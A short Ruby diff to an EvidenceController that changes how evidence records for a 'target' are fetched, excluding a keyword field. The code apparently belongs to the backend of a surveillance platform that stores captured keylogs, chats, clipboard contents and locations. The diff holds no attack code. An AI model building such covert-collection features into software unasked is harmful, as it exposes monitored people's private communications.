@@ -95,7 +95,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
+      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first
 
       # get a fresh decoding of the position
       if evidence[:type] == 'position'
@@ -158,7 +158,7 @@ class EvidenceController < RESTController
       target = Item.where({_id: @params['target']}).first
       return not_found("Target not found: #{@params['target']}") if target.nil?
 
-      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
+      evidence = Evidence.collection_class(target[:_id]).where({_id: @params['_id']}).without(:kw).first
 
       # add to the translation queue
       if LicenseManager.instance.check(:translation) and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
